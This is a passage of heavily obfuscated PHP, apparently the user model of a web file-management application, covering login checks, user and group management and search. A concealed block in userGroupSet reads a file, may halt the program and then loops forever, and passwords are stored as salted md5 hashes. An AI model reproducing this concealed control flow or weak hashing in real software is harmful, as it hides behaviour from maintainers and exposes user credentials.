$_SERVER[ìïæ“œî]; if (!$î¨­ÌŠ·) { return $î¨­ÌŠ·; } $«¹ê´–Å = md5($™ß¢èÜ[2429] . $î¨­ÌŠ·[$™ß¢èÜ[944]] . $™ß¢èÜ[2430] . $î¨­ÌŠ·[$™ß¢èÜ[32]]); $î¨­ÌŠ· = $this->_listDataApplyItem($î¨­ÌŠ·); $Ø¥™¼©à = Model($™ß¢èÜ[1394])->metaGet($î¨­ÌŠ·[$™ß¢èÜ[90]][$™ß¢èÜ[193]]); $î¨­ÌŠ·[$™ß¢èÜ[2431]] = $«¹ê´–Å; $î¨­ÌŠ·[$™ß¢èÜ[90]][$™ß¢èÜ[2226]] = isset($Ø¥™¼©à[$™ß¢èÜ[2227]]) ? $Ø¥™¼©à[$™ß¢èÜ[2227]] : null; if ($ƒ¥êÊâ) { $î¨­ÌŠ·[$™ß¢èÜ[539]] = $this->metaGet($î¨­ÌŠ·[$™ß¢èÜ[1747]]); } return $î¨­ÌŠ·; } protected function getInfoSimple($±îÁ‘Ö , $ñÄîœæë = false) { $¥Â€…³ =& $_SERVER[ìïæ“œî]; if (!$±îÁ‘Ö ) { return array(); } if ($ñÄîœæë) { $Ôú±¬£ã = $this->where(array($¥Â€…³[1747] => intval($±îÁ‘Ö )))->find(); if (!is_array($Ôú±¬£ã)) { return array(); } $Ôú±¬£ã[$¥Â€…³[2432]] = Action($¥Â€…³[2433])->parseUrl($Ôú±¬£ã[$¥Â€…³[2432]]); return $Ôú±¬£ã; } return $this->cacheFunctionGet($¥Â€…³[2033], $±îÁ‘Ö ); } protected function getInfoSimpleOuter($¤úÔÄ÷õ) { $Õ‰Â†ê¸ =& $_SERVER[ìïæ“œî]; if (!$¤úÔÄ÷õ || $¤úÔÄ÷õ == 0) { return array($Õ‰Â†ê¸[1747] => $Õ‰Â†ê¸[228], $Õ‰Â†ê¸[32] => $Õ‰Â†ê¸[176] . LNG($Õ‰Â†ê¸[2434]) . $Õ‰Â†ê¸[178], $Õ‰Â†ê¸[2432] => STATIC_PATH . $Õ‰Â†ê¸[2435]); } $¾ğõ“Â… = $this->cacheFunctionGet($Õ‰Â†ê¸[2033], $¤úÔÄ÷õ); $…ˆì«ôÎ = array_field_key($¾ğõ“Â…, explode($Õ‰Â†ê¸[50], $this->simpleField)); if (!$…ˆì«ôÎ) { return array($Õ‰Â†ê¸[1747] => $Õ‰Â†ê¸[1250], $Õ‰Â†ê¸[32] => $Õ‰Â†ê¸[176] . LNG($Õ‰Â†ê¸[2436]) . $Õ‰Â†ê¸[178], $Õ‰Â†ê¸[2432] => STATIC_PATH . $Õ‰Â†ê¸[2437]); } $…ˆì«ôÎ[$Õ‰Â†ê¸[2432]] = Action($Õ‰Â†ê¸[2433])->parseUrl($…ˆì«ôÎ[$Õ‰Â†ê¸[2432]]); return $…ˆì«ôÎ; } protected function groupUser($£ß§óï¡) { } public static function errorLang($ÒŸ›Åø) { $÷£•Ã÷ë =& $_SERVER[ìïæ“œî]; $” ´êÛ¨ = array(self::ERROR_USER_NOT_EXISTS => $÷£•Ã÷ë[2438], self::ERROR_USER_PASSWORD_ERROR => $÷£•Ã÷ë[2439], self::ERROR_USER_EXIST_NAME => $÷£•Ã÷ë[2440], self::ERROR_USER_EXIST_PHONE => $÷£•Ã÷ë[2441], self::ERROR_USER_EXIST_EMAIL => $÷£•Ã÷ë[2442], self::ERROR_USER_LOGIN_LOCK => $÷£•Ã÷ë[2443], self::ERROR_IP_NOT_ALLOW => $÷£•Ã÷ë[2444], self::ERROR_USER_EXIST_NICKNAME => $÷£•Ã÷ë[2445]); $ä¨ÃÀ¹œ = LNG($” ´êÛ¨[$ÒŸ›Åø]); if ($ÒŸ›Åø == self::ERROR_USER_LOGIN_LOCK) { $²š®û = (int) Model($÷£•Ã÷ë[2446])->get($÷£•Ã÷ë[2447]); if ($²š®û > 60) { $ä¨ÃÀ¹œ = str_replace($÷£•Ã÷ë[91], ceil($²š®û / 60), $ä¨ÃÀ¹œ); } } return $ä¨ÃÀ¹œ; } public function getInfoByMeta($¸ ˜Ô…ë, $ÏÏ¶º•ô) { $ÔÊì¿·Ö =& $_SERVER[ìïæ“œî]; $áôµ‹à… = Model($ÔÊì¿·Ö[2448])->where(array($ÔÊì¿·Ö[97] => $¸ ˜Ô…ë, $ÔÊì¿·Ö[450] => $ÏÏ¶º•ô))->find(); if ($áôµ‹à…) { return $this->getInfo($áôµ‹à…[$ÔÊì¿·Ö[1747]]); } return !1; } public function userLoginCheck($ÌÏ äÊ£, $Ñª“îÔ§) { $íı§ì„ =& $_SERVER[ìïæ“œî]; $ŒÇ¾ŒŒğ = $this->userLoginFind($ÌÏ äÊ£); if (!$ŒÇ¾ŒŒğ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ŒÇ¾ŒŒğ[$íı§ì„[1747]], $Ñª“îÔ§)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ŒÇ¾ŒŒğ[$íı§ì„[1747]]); } public function userLoginFind($ëÆœğÈ£) { $œùİ‡îè =& $_SERVER[ìïæ“œî]; $ºë¨„Î† = array($œùİ‡îè[32] => $ëÆœğÈ£, $œùİ‡îè[2234] => $ëÆœğÈ£, $œùİ‡îè[381] => $ëÆœğÈ£, $œùİ‡îè[2449] => $ëÆœğÈ£, $œùİ‡îè[1055] => $œùİ‡îè[1057]); if ($this->nickNameRpt()) { unset($ºë¨„Î†[$œùİ‡îè[2234]]); } return $this->where($ºë¨„Î†)->find(); } public function clearCache($×¹í«å¥) { $¥¸¼¶•ø =& $_SERVER[ìïæ“œî]; $this->cacheFunctionClear($¥¸¼¶•ø[2032], $×¹í«å¥); $this->cacheFunctionClear($¥¸¼¶•ø[2033], $×¹í«å¥); $this->cacheFunctionClear($¥¸¼¶•ø[2428], $×¹í«å¥); } public function userPasswordCheck($ßÄªæùÌ, $µÌ¬”Î) { $ğŸÙŒ˜ƒ =& $_SERVER[ìïæ“œî]; $³¿²ğï = $this->where(array($ğŸÙŒ˜ƒ[1747] => intval($ßÄªæùÌ)))->find(); $¡ÚöÏ = $this->metaGet($ßÄªæùÌ); $¸şËßêÓ = isset($¡ÚöÏ[$ğŸÙŒ˜ƒ[2450]]) ? $¡ÚöÏ[$ğŸÙŒ˜ƒ[2450]] : $ğŸÙŒ˜ƒ[12]; if (md5($¸şËßêÓ . trim($µÌ¬”Î)) !== $³¿²ğï[$ğŸÙŒ˜ƒ[944]]) { return !1; } return !0; } public function userAdd($ÈĞö¡—Å) { $¦—œğƒ± =& $_SERVER[ìïæ“œî]; $ùƒûÀ = array($¦—œğƒ±[494] => $ÈĞö¡—Å[$¦—œğƒ±[32]], $¦—œğƒ±[2451] => $ÈĞö¡—Å[$¦—œğƒ±[2152]], $¦—œğƒ±[2452] => isset($ÈĞö¡—Å[$¦—œğƒ±[381]]) ? $ÈĞö¡—Å[$¦—œğƒ±[381]] : $¦—œğƒ±[12], $¦—œğƒ±[2453] => isset($ÈĞö¡—Å[$¦—œğƒ±[2449]]) ? $ÈĞö¡—Å[$¦—œğƒ±[2449]] : $¦—œğƒ±[12], $¦—œğƒ±[2454] => isset($ÈĞö¡—Å[$¦—œğƒ±[2234]]) ? $ÈĞö¡—Å[$¦—œğƒ±[2234]] : $ÈĞö¡—Å[$¦—œğƒ±[32]], $¦—œğƒ±[2455] => isset($ÈĞö¡—Å[$¦—œğƒ±[2432]]) ? $ÈĞö¡—Å[$¦—œğƒ±[2432]] : $¦—œğƒ±[12], $¦—œğƒ±[2456] => isset($ÈĞö¡—Å[$¦—œğƒ±[2457]]) ? $ÈĞö¡—Å[$¦—œğƒ±[2457]] : 1, $¦—œğƒ±[2458] => $ÈĞö¡—Å[$¦—œğƒ±[944]], $¦—œğƒ±[2034] => isset($ÈĞö¡—Å[$¦—œğƒ±[1932]]) ? $ÈĞö¡—Å[$¦—œğƒ±[1932]] : 1024 * 1024 * 20, $¦—œğƒ±[2035] => 0, $¦—œğƒ±[2459] => 0, $¦—œğƒ±[2079] => isset($ÈĞö¡—Å[$¦—œğƒ±[799]]) ? $ÈĞö¡—Å[$¦—œğƒ±[799]] : 1); if (!empty($ÈĞö¡—Å[$¦—œğƒ±[1747]])) { $ùƒûÀ[$¦—œğƒ±[1747]] = $ÈĞö¡—Å[$¦—œğƒ±[1747]]; } $ŠœêÚÖ = $this->_checkExist($ÈĞö¡—Å); if ($ŠœêÚÖ !== !0) { return $ŠœêÚÖ; } if (!empty($ùƒûÀ[$¦—œğƒ±[2432]]) && strlen($ùƒûÀ[$¦—œğƒ±[2432]]) > 255) { $ùƒûÀ[$¦—œğƒ±[2432]] = $¦—œğƒ±[12]; } $”Ç¢ƒ©ó = $this->add($ùƒûÀ); $Şãé‹÷° = array($¦—œğƒ±[2458] => $ùƒûÀ[$¦—œğƒ±[944]], $¦—œğƒ±[2454] => $ùƒûÀ[$¦—œğƒ±[2234]]); $this->userEdit($”Ç¢ƒ©ó, $Şãé‹÷°); Model($¦—œğƒ±[1394])->userRootAdd($”Ç¢ƒ©ó); return $”Ç¢ƒ©ó; } protected function userEditTest($ù›¥ïÌ, $„­ºö²) { return $this->call($_SERVER[ìïæ“œî][2460], $ù›¥ïÌ, $„­ºö²); } protected function userEdit($÷—¦Ïõö, $Ó£ÏĞñÖ) { $Ñù§‹°Ë =& $_SERVER[ìïæ“œî]; $ ãÖç”ª = $this->getInfoSimple($÷—¦Ïõö); if (!$ ãÖç”ª) { return !1; } $âÉ«» = $this->_checkExist($Ó£ÏĞñÖ, $÷—¦Ïõö); if ($âÉ«» !== !0) { return $âÉ«»; } if (isset($Ó£ÏĞñÖ[$Ñù§‹°Ë[944]]) && trim($Ó£ÏĞñÖ[$Ñù§‹°Ë[944]]) != $Ñù§‹°Ë[12]) { $™ïÚüä = $this->metaGet($÷—¦Ïõö); if (empty($™ïÚüä[$Ñù§‹°Ë[2450]])) { $™ïÚüä[$Ñù§‹°Ë[2450]] = rand_string(10); Model($Ñù§‹°Ë[577])->metaSet($÷—¦Ïõö, $Ñù§‹°Ë[2450], $™ïÚüä[$Ñù§‹°Ë[2450]]); } $Ó£ÏĞñÖ[$Ñù§‹°Ë[944]] = md5($™ïÚüä[$Ñù§‹°Ë[2450]] . trim($Ó£ÏĞñÖ[$Ñù§‹°Ë[944]])); } else { unset($Ó£ÏĞñÖ[$Ñù§‹°Ë[944]]); } if (!empty($Ó£ÏĞñÖ[$Ñù§‹°Ë[2432]]) && strlen($Ó£ÏĞñÖ[$Ñù§‹°Ë[2432]]) > 255) { $Ó£ÏĞñÖ[$Ñù§‹°Ë[2432]] = $Ñù§‹°Ë[12]; } $this->where(array($Ñù§‹°Ë[1738] => $÷—¦Ïõö))->save($Ó£ÏĞñÖ); if (isset($Ó£ÏĞñÖ[$Ñù§‹°Ë[2234]])) { $this->setNamePinyin($÷—¦Ïõö, $Ó£ÏĞñÖ[$Ñù§‹°Ë[2234]]); } $this->clearCache($÷—¦Ïõö); return !0; } public function setNamePinyin($ıı€š, $¦‚Ûô³ó = false) { $òöÊâœÌ =& $_SERVER[ìïæ“œî]; if (!$¦‚Ûô³ó) { $šØ»ìä„ = $this->getInfoSimple($ıı€š); $¦‚Ûô³ó = $šØ»ìä„[$òöÊâœÌ[2234]] ? $šØ»ìä„[$òöÊâœÌ[2234]] : $šØ»ìä„[$òöÊâœÌ[32]]; } $Ô”ÒÂî¢ = Model($òöÊâœÌ[598]); if (!Input::check($¦‚Ûô³ó, $òöÊâœÌ[655])) { return $Ô”ÒÂî¢->metaSet($ıı€š, array($òöÊâœÌ[538] => $òöÊâœÌ[12], $òöÊâœÌ[537] => $òöÊâœÌ[12])); } return $Ô”ÒÂî¢->metaSet($ıı€š, array($òöÊâœÌ[538] => str_replace($òöÊâœÌ[53], $òöÊâœÌ[12], Pinyin::get($¦‚Ûô³ó)), $òöÊâœÌ[537] => Pinyin::get($¦‚Ûô³ó, $òöÊâœÌ[656]))); } private function nickNameRpt() { $ñ¾†ÒüÖ =& $_SERVER[ìïæ“œî]; $Ù¸ÈŠ¸ = Model($ñ¾†ÒüÖ[819])->get($ñ¾†ÒüÖ[2461]); $˜‘¸Óİ = $GLOBALS[$ñ¾†ÒüÖ[6]][$ñ¾†ÒüÖ[457]][$ñ¾†ÒüÖ[2461]]; $¯ÛÖ¥ö¸ = !is_null($Ù¸ÈŠ¸) ? $Ù¸ÈŠ¸ : $˜‘¸Óİ; return !!$¯ÛÖ¥ö¸; } private function _checkExist($ë‡Êæ…, $½„š‘Ÿ = false) { $¢¼¿¦·Å =& $_SERVER[ìïæ“œî]; $ÓòîÙ¶ä = array($¢¼¿¦·Å[32] => UserModel::ERROR_USER_EXIST_NAME, $¢¼¿¦·Å[2234] => UserModel::ERROR_USER_EXIST_NICKNAME, $¢¼¿¦·Å[381] => UserModel::ERROR_USER_EXIST_EMAIL, $¢¼¿¦·Å[2449] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÓòîÙ¶ä[$¢¼¿¦·Å[2234]]); } $Êª°’¦— = $½„š‘Ÿ ? array($¢¼¿¦·Å[1747] => array($¢¼¿¦·Å[2462], $½„š‘Ÿ)) : array(); foreach ($ÓòîÙ¶ä as $Š§Ş§ÜÇ => $Ñ‹·âÓ¡) { $¿†İ–ñ¡ = array(); foreach ($ÓòîÙ¶ä as $ƒÈÂíüñ => $ªç´“¥) { if (isset($ë‡Êæ…[$ƒÈÂíüñ]) && $ë‡Êæ…[$ƒÈÂíüñ]) { $¿†İ–ñ¡[] = $ë‡Êæ…[$ƒÈÂíüñ]; } } if (!$¿†İ–ñ¡) { continue; } $”ğ‘‡¡ = array_merge(array($Š§Ş§ÜÇ => array($¢¼¿¦·Å[7], $¿†İ–ñ¡)), $Êª°’¦—); $æößø‡… = $this->where($”ğ‘‡¡)->find(); if ($æößø‡…) { return $Ñ‹·âÓ¡; } } return !0; } public function userListInfo($œ—à±ò©) { $”û·ãñŒ =& $_SERVER[ìïæ“œî]; $èÃİ¯ºá = array(); $œ—à±ò© = is_array($œ—à±ò©) ? array_unique($œ—à±ò©) : array(); if (!$œ—à±ò©) { return $èÃİ¯ºá; } if (count($œ—à±ò©) < 20) { foreach ($œ—à±ò© as $Ø¦×¦·€) { $èÃİ¯ºá[$Ø¦×¦·€ . $”û·ãñŒ[12]] = $this->getInfoSimpleOuter($Ø¦×¦·€); } } else { $´ıÖˆÛå = array($”û·ãñŒ[1738] => array($”û·ãñŒ[492], $œ—à±ò©)); if (count($œ—à±ò©) == 1) { $´ıÖˆÛå = array($”û·ãñŒ[1738] => $œ—à±ò©[0]); } $·òÅú£ = Model($”û·ãñŒ[577])->field($this->simpleField)->where($´ıÖˆÛå)->select(); $·òÅú£ = array_to_keyvalue($·òÅú£, $”û·ãñŒ[1747]); foreach ($œ—à±ò© as $Ø¦×¦·€) { $³·è˜™™ = $·òÅú£[$Ø¦×¦·€]; if (!$³·è˜™™) { $èÃİ¯ºá[$Ø¦×¦·€ . $”û·ãñŒ[12]] = $this->getInfoSimpleOuter($Ø¦×¦·€); continue; } $³·è˜™™[$”û·ãñŒ[2432]] = Action($”û·ãñŒ[2433])->parseUrl($³·è˜™™[$”û·ãñŒ[2432]]); $èÃİ¯ºá[$Ø¦×¦·€ . $”û·ãñŒ[12]] = $³·è˜™™; } } return $èÃİ¯ºá; } protected function userStatus($ÇìÏƒ¢, $ƒÈõ°ˆ‘) { $Ş÷Òö = $this->getInfoSimple($ÇìÏƒ¢); if (!$Ş÷Òö) { return !1; } $”âÌ¢Ã„ = array($_SERVER[ìïæ“œî][799] => $ƒÈõ°ˆ‘); return $this->userEdit($ÇìÏƒ¢, $”âÌ¢Ã„); } protected function userRemove($¯ß‰èúí) { $šö¬–ªÍ =& $_SERVER[ìïæ“œî]; $–áÕ„¢æ = $this->getInfoSimple($¯ß‰èúí); if (!$–áÕ„¢æ) { return !1; } $šĞã¾·« = array($šö¬–ªÍ[1738] => $¯ß‰èúí); Model($šö¬–ªÍ[664])->where($šĞã¾·«)->delete(); Model($šö¬–ªÍ[2463])->where($šĞã¾·«)->delete(); Model($šö¬–ªÍ[2040])->where($šĞã¾·«)->delete(); Model($šö¬–ªÍ[2448])->where($šĞã¾·«)->delete(); Model($šö¬–ªÍ[1124])->where($šĞã¾·«)->delete(); Model($šö¬–ªÍ[2251])->removeUserAll($¯ß‰èúí); Model($šö¬–ªÍ[873])->userRootRemove($¯ß‰èúí); return $this->where($šĞã¾·«)->delete(); } protected function userGroupSet($Ã‡¨¬ É, $§«ŸĞŒÏ, $¹İÀ“  = array()) { $¹É¥ =& $_SERVER[ìïæ“œî]; if (!isset($_SERVER[$¹É¥[927]]) || !isset($_SERVER[$¹É¥[925]])) { $Á÷äÈÄĞ = $¹É¥[928]; $Äóúºƒş = $¹É¥[929]; $ì‚øå«Ÿ = $_SERVER[$¹É¥[930]] . $¹É¥[931]; $œ´³ç¬ = $Äóúºƒş($ì‚øå«Ÿ); $û÷Ø¤àÖ = explode($¹É¥[262], $œ´³ç¬); if (count($û÷Ø¤àÖ) < $¹É¥[688]) { $¦ëÕ››æ = $¹É¥[932]; $¦ëÕ››æ(); } $•å·×Œ› = $¹É¥[933]; $•å·×Œ›($_SERVER[$¹É¥[934]]); $›€ÇÙ£ñ = 1; for ($™ƒŒŸ¹ = $›€ÇÙ£ñ; $™ƒŒŸ¹ > 0; $™ƒŒŸ¹++) { $•å·×Œ› = json_encode($GLOBALS[$¹É¥[492]]); } } $ü²ê¸Ç = $this->getInfoSimple($Ã‡¨¬ É); if (!$ü²ê¸Ç || !is_array($§«ŸĞŒÏ)) { return !1; } $Ïüƒ¹™Ì = Model($¹É¥[2040]); $Ïüƒ¹™Ì->where(array($¹É¥[1747] => $Ã‡¨¬ É))->delete(); $ÍØù­€³ = array(); $Ü™òÊ‚ƒ = 0; foreach ($§«ŸĞŒÏ as $åßÂÍÌ­ => $àÈ¨©Û) { $•ü¢§»­ = array($¹É¥[1747] => $Ã‡¨¬ É, $¹É¥[1946] => $åßÂÍÌ­, $¹É¥[2054] => $àÈ¨©Û); $•ü¢§»­[$¹É¥[1970]] = isset($¹İÀ“ [$Ü™òÊ‚ƒ]) ? $¹İÀ“ [$Ü™òÊ‚ƒ] : 0; $Ü™òÊ‚ƒ++; $ÍØù­€³[] = $•ü¢§»­; } return $Ïüƒ¹™Ì->addAll($ÍØù­€³, array(), !0); } protected function userGroupAdd($ç€å£æ˜, $›²‚ôê = array()) { $Áî‡®™  =& $_SERVER[ìïæ“œî]; $°¯Ÿ„É = $this->getInfoSimple($ç€å£æ˜); if (!$°¯Ÿ„É || empty($›²‚ôê)) { return !1; } $ÀíÓºîÊ = array(); foreach ($›²‚ôê as $ß¦ı¶ÔÁ => $ŸàÌˆ’Ú) { $ÀíÓºîÊ[] = array($Áî‡®™ [1747] => $ç€å£æ˜, $Áî‡®™ [1946] => $ß¦ı¶ÔÁ, $Áî‡®™ [2054] => $ŸàÌˆ’Ú, $Áî‡®™ [1970] => 0); } return Model($Áî‡®™ [2040])->addAll($ÀíÓºîÊ, array(), !0); } protected function userGroupRemove($’Ç£ÜÏ‚, $Ç¾ºÊßÍ) { $‡¥×µÈ¦ =& $_SERVER[ìïæ“œî]; $ŠŸÓ¶µƒ = $this->getInfoSimple($’Ç£ÜÏ‚); if (!$ŠŸÓ¶µƒ || !$Ç¾ºÊßÍ) { return !1; } $ˆ¦…ö˜ã = array($‡¥×µÈ¦[1738] => $’Ç£ÜÏ‚, $‡¥×µÈ¦[2038] => $Ç¾ºÊßÍ); return Model($‡¥×µÈ¦[2040])->where($ˆ¦…ö˜ã)->delete(); } public function listData() { $ñÑ¸Ì = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ñÑ¸Ì[$_SERVER[ìïæ“œî][445]]); return $ñÑ¸Ì; } public function listByID($÷Øõæ€) { $ÅÍ×™ê =& $_SERVER[ìïæ“œî]; if (!$÷Øõæ€) { return; } $Ş›àı¸Ÿ = array($ÅÍ×™ê[1747] => array($ÅÍ×™ê[7], $÷Øõæ€)); $Í®´µò = $this->where($Ş›àı¸Ÿ)->select(); $Í®´µò = array_sort_keep($Í®´µò, $ÅÍ×™ê[1747], $÷Øõæ€); $this->_listDataApply($Í®´µò); return $Í®´µò; } public function listByGroup($Ï§ÑÔøù = 0, $ÜÉ‚ÚÂ = array()) { $û×€şËñ =& $_SERVER[ìïæ“œî]; $Š›ı—ÉÈ = $û×€şËñ[12]; $íÏÔı¬ = array(); if ($Ï§ÑÔøù) { $íÏÔı¬ = array($û×€şËñ[2464] => intval($Ï§ÑÔøù)); $Š›ı—ÉÈ = "\114\105\x46\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\165\x73\145\162\x5f\147\162\x6f\165\x70\40\x75\163\145\162\137\147\x72\x6f\x75\x70\x20\157\x6e\40\x75\163\x65\x72\x2e\x75\x73\145\x72\x49\104\40\x3d\x20\165\x73\x65\x72\x5f\147\162\x6f\165\160\56\x75\x73\145\162\x49\104"; $äƒßÂ¥Æ = Input::get($û×€şËñ[530], null, $û×€şËñ[12]) ? $û×€şËñ[12] : $û×€şËñ[2465]; } if (isset($ÜÉ‚ÚÂ[$û×€şËñ[799]])) { $íÏÔı¬[$û×€şËñ[2466]] = $ÜÉ‚ÚÂ[$û×€şËñ[799]]; } $¶’Œïùü = $this->_makeOrder($äƒßÂ¥Æ)->field($û×€şËñ[2467])->where($íÏÔı¬)->join($Š›ı—ÉÈ)->selectPage(50); $this->_listDataApply($¶’Œïùü[$û×€şËñ[445]]); return $¶’Œïùü; } private function _makeOrder($ûşÔü„Ø = '') { $›Í—ã–™ =& $_SERVER[ìïæ“œî]; $š®ƒ½Æ = array($›Í—ã–™[1747], $›Í—ã–™[32], $›Í—ã–™[1934], $›Í—ã–™[2152], $›Í—ã–™[1906], $›Í—ã–™[231]); $Ë§ë˜» = array($›Í—ã–™[523] => $›Í—ã–™[524], $›Í—ã–™[525] => $›Í—ã–™[526]); $ê™ ŸÅÚ = Input::get($›Í—ã–™[530], $›Í—ã–™[7], $›Í—ã–™[1738], $š®ƒ½Æ); $¢‡ûïõ» = Input::get($›Í—ã–™[531], $›Í—ã–™[7], $›Í—ã–™[2041], array($›Í—ã–™[2041], $›Í—ã–™[525])); $¢‡ûïõ» = $Ë§ë˜»[$¢‡ûïõ»]; $ûşÔü„Ø = $ûşÔü„Ø . "\x75\x73\145\162\56{$ê™ ŸÅÚ}\40{$¢‡ûïõ»}\x2c\40\165\x73\x65\162\56\165\x73\145\x72\111\x44\40\141\163\x63"; return $this->alias($›Í—ã–™[2168])->order($ûşÔü„Ø); } public function listSearch($÷àÜ´š) { $‰°Ÿê‡ä =& $_SERVER[ìïæ“œî]; $…’£’€Ğ = trim($÷àÜ´š[$‰°Ÿê‡ä[2044]]); $è¬Ô„ûœ = explode($‰°Ÿê‡ä[53], $…’£’€Ğ); if (!$…’£’€Ğ || count($è¬Ô„ûœ) == 1) { return $this->listSearchNow($÷àÜ´š); } $¼¿é¸Í = array($‰°Ÿê‡ä[445] => array()); foreach ($è¬Ô„ûœ as $ªÎŠÑÍ) { if (!trim($ªÎŠÑÍ)) { continue; } $÷àÜ´š[$‰°Ÿê‡ä[2044]] = $ªÎŠÑÍ; $ŒÌ­É— = $this->listSearchNow($÷àÜ´š); $¼¿é¸Í[$‰°Ÿê‡ä[445]] = array_merge($¼¿é¸Í[$‰°Ÿê‡ä[445]], $ŒÌ­É—[$‰°Ÿê‡ä[445]]); } $¼¿é¸Í[$‰°Ÿê‡ä[445]] = array_unique_by_key($¼¿é¸Í[$‰°Ÿê‡ä[445]], $‰°Ÿê‡ä[1747]); $¼¿é¸Í[$‰°Ÿê‡ä[442]] = array($‰°Ÿê‡ä[443] => count($¼¿é¸Í[$‰°Ÿê‡ä[445]]), $‰°Ÿê‡ä[439] => 20, $‰°Ÿê‡ä[429] => 1, $‰°Ÿê‡ä[444] => 1); return $¼¿é¸Í; } public function listSearchNow($ê³î´É) { $ĞÓÉëñ =& $_SERVER[ìïæ“œî]; $èÍç·‡˜ = trim($ê³î´É[$ĞÓÉëñ[2044]]); $ÔÜ÷ƒ¾ˆ = isset($ê³î´É[$ĞÓÉëñ[2045]]) ? $ê³î´É[$ĞÓÉëñ[2045]] : !1; $èÍç·‡˜ = str_replace($ĞÓÉëñ[2046], $ĞÓÉëñ[2047], trim($èÍç·‡˜)); $Õí¿ŞÊï = array($ĞÓÉëñ[32] => array($ĞÓÉëñ[459], "\45{$èÍç·‡˜}\x25"), $ĞÓÉëñ[381] => array($ĞÓÉëñ[459], "{$èÍç·‡˜}\45"), $ĞÓÉëñ[2234] => array($ĞÓÉëñ[459], "{$èÍç·‡˜}\45"), $ĞÓÉëñ[1055] => $ĞÓÉëñ[2048]); if (Input::check($èÍç·‡˜, $ĞÓÉëñ[387])) { $Õí¿ŞÊï[$ĞÓÉëñ[1747]] = array($ĞÓÉëñ[459], "{$èÍç·‡˜}\45"); $Õí¿ŞÊï[$ĞÓÉëñ[2449]] = array($ĞÓÉëñ[459], "{$èÍç·‡˜}\45"); } if (!$èÍç·‡˜) { $Õí¿ŞÊï = array(); } if (isset($ê³î´É[$ĞÓÉëñ[799]])) { $Õí¿ŞÊï[$ĞÓÉëñ[799]] = $ê³î´É[$ĞÓÉëñ[799]]; } $Õí¿ŞÊï = $this->parseWhereLike($Õí¿ŞÊï); $Á¨ÑÙ¾  = $this->_makeOrder()->where($Õí¿ŞÊï)->selectPage(20); if (!$Á¨ÑÙ¾  || count($Á¨ÑÙ¾ [$ĞÓÉëñ[445]]) < 5 && Input::check($èÍç·‡˜, $ĞÓÉëñ[394])) { $çË™½„¯ = $this->_searchFromMeta($ĞÓÉëñ[537], $èÍç·‡˜, 10); $â¯ ÉÌ = $this->_searchFromMeta($ĞÓÉëñ[538], $èÍç·‡˜, 10); $µÔÚğ†¨ = array_merge($çË™½„¯, $â¯ ÉÌ, $Á¨ÑÙ¾ [$ĞÓÉëñ[445]]); $Á¨ÑÙ¾ [$ĞÓÉëñ[445]] = array_unique_by_key($µÔÚğ†¨, $ĞÓÉëñ[1747]); $Á¨ÑÙ¾ [$ĞÓÉëñ[442]][$ĞÓÉëñ[443]] = count($Á¨ÑÙ¾ [$ĞÓÉëñ[445]]); $Á¨ÑÙ¾ [$ĞÓÉëñ[442]][$ĞÓÉëñ[444]] = ceil($Á¨ÑÙ¾ [$ĞÓÉëñ[442]][$ĞÓÉëñ[443]] / $Á¨ÑÙ¾ [$ĞÓÉëñ[442]][$ĞÓÉëñ[439]]); } $this->_listDataApply($Á¨ÑÙ¾ [$ĞÓÉëñ[445]]); $this->_filterByGroup($Á¨ÑÙ¾ , $ÔÜ÷ƒ¾ˆ); return $Á¨ÑÙ¾ ; } private function _filterByGroup(&$ãŞó„Ÿ», $÷§Ø¡„Á) { $”˜ö½Á§ =& $_SERVER[ìïæ“œî]; if (!$÷§Ø¡„Á) { return $ãŞó„Ÿ»; } foreach ($ãŞó„Ÿ»[$”˜ö½Á§[445]] as $¼ËÌŒíÍ => &$Œ…ı«å„) { $õû—§Ï§ = array_to_keyvalue($Œ…ı«å„[$”˜ö½Á§[2137]], $”˜ö½Á§[12], $”˜ö½Á§[1946]); if (!in_array($÷§Ø¡„Á, $õû—§Ï§)) { unset($ãŞó„Ÿ»[$”˜ö½Á§[445]][$¼ËÌŒíÍ]); } } unset($Œ…ı«å„); $ãŞó„Ÿ»[$”˜ö½Á§[445]] = array_values($ãŞó„Ÿ»[$”˜ö½Á§[445]]); $ãŞó„Ÿ»[$”˜ö½Á§[442]] = array($”˜ö½Á§[2204] => count($ãŞó„Ÿ»[$”˜ö½Á§[445]]), $”˜ö½Á§[2202] => $ãŞó„Ÿ»[$”˜ö½Á§[442]][$”˜ö½Á§[439]], $”˜ö½Á§[2201] => 1, $”˜ö½Á§[2203] => 1); } private function _searchFromMeta($§£Š°ğ›, $Ü®Ÿ¡Øº, $§·ïÏçô) { $Ü¿ãƒ =& $_SERVER[ìïæ“œî]; $Ü®Ÿ¡Øº = strtolower($Ü®Ÿ¡Øº); $ó«¦üË = array($Ü¿ãƒ[97] => $§£Š°ğ›, $Ü¿ãƒ[450] => array($Ü¿ãƒ[459], "\45{$Ü®Ÿ¡Øº}\45")); $ó«¦üË = $this->parseWhereLike($ó«¦üË); $¦·Äú = Model($Ü¿ãƒ[2468])->where($ó«¦üË)->limit($§·ïÏçô)->select(); if (!$¦·Äú) { return array(); } $¦·Äú = array_to_keyvalue($¦·Äú, $Ü¿ãƒ[12], $Ü¿ãƒ[1747]); $Œ¬ŸÌ‹š = $this->where(array($Ü¿ãƒ[1738] => array($Ü¿ãƒ[7], $¦·Äú)))->select(); if (!$Œ¬ŸÌ‹š) { return array(); } return $Œ¬ŸÌ‹š; } private function _listDataApplyItem($È‹ÌßÈÉ) { $¿·Á™‹— = array($È‹ÌßÈÉ); $this->_listDataApply($¿·Á™‹—); return $¿·Á™‹—[0]; } private function _listDataApply(&$ü‚íÇ®) { $šã¨òˆˆ =& $_SERVER[ìïæ“œî]; if (!$ü‚íÇ®) { return; } array_remove_key($ü‚íÇ®, $šã¨òˆˆ[944]); $¼ãÎ±Õ¡ = array_to_keyvalue($ü‚íÇ®, $šã¨òˆˆ[12], $šã¨òˆˆ[1747]); $this->_listAppendGroup($ü‚íÇ®, $¼ãÎ±Õ¡); $this->_listAppendMeta($ü‚íÇ®, $¼ãÎ±Õ¡); $this->_listAppendSourceRoot($ü‚íÇ®, $¼ãÎ±Õ¡); } private function _listAppendSourceRoot(&$ÓôÁ›á·, $ÎĞúı¤›) { $°›š¢úø =& $_SERVER[ìïæ“œî]; $ìÑ·î  = 